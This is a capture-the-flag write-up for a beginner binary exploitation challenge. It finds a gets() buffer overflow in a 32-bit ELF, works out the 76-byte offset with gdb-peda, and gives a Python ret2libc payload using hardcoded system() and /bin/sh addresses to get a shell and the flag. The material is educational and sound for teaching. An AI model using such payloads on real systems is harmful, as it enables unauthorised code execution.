## **Challenge Name**: Buffer Overflow 101  
**Category**: Binary Exploitation  
**Points**: 150  
**Description**:  
This challenge provides an executable file and hints at exploiting a basic buffer overflow vulnerability. The goal is to gain a shell.

---

### **Task Description**  

The challenge file `vuln` is a 32-bit ELF binary. It contains a vulnerable function that allows for a buffer overflow.  
Below is the task description in the provided challenge text:

```tcolorbox
The program takes user input without proper bounds checking. Exploit this to execute the shellcode and get the flag.
```

---

### **Technical Analysis**

#### **Step 1: File Information**  
First, I ran the `file` command to identify the binary type:  
```bash
file vuln
```
**Output**:  
```
vuln: ELF 32-bit LSB executable, Intel 80386, dynamically linked
```

#### **Step 2: Decompilation and Vulnerability Search**  
I loaded the binary into `Ghidra` and inspected the function `vulnerable_function()`. The code revealed:  

```c
void vulnerable_function() {
    char buffer[64];
    gets(buffer);
    printf("Hello, %s!", buffer);
}
```

**Key Observations**:  
- The `gets()` function is used, which doesn't check input bounds.  
- This allows for overwriting the return address on the stack.  

---

### **Exploit Development**

#### **Step 3: Determine the Offset**  
Using `gdb-peda`, I determined the offset to the return address:  
```bash
pattern_create 100
run
pattern_offset <crashing_address>
```

**Offset**: 76 bytes.

#### **Step 4: Identify System Address**  
The binary was dynamically linked. I used `readelf` to find the address of `system`:  
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

#### **Step 5: Create the Exploit Payload**  
The payload has three parts:  
1. Padding to fill the buffer (76 bytes).  
2. Address of `system()` function.  
3. Address of `/bin/sh` string in memory.  

Final payload:  

```python
import struct

padding = b"A" * 76
system_addr = struct.pack("<I", 0xf7e4c850)  # Address of system()
bin_sh_addr = struct.pack("<I", 0xf7f897ec)  # Address of /bin/sh
payload = padding + system_addr + b"JUNK" + bin_sh_addr

with open("payload", "wb") as f:
    f.write(payload)
```

#### **Step 6: Exploit Execution**  
I passed the payload into the binary:  
```bash
cat payload | ./vuln
```

**Result**:  
I obtained a shell. Running `cat flag.txt` revealed the flag.  

---

### **Flag**  

```
CTF{BUFFER_OVERFLOW_MASTER}
```

---

### **Learnings**  
- Always check for unsafe functions like `gets()` in binary exploitation challenges.  
- Dynamically linked binaries require resolving libc function addresses manually.  
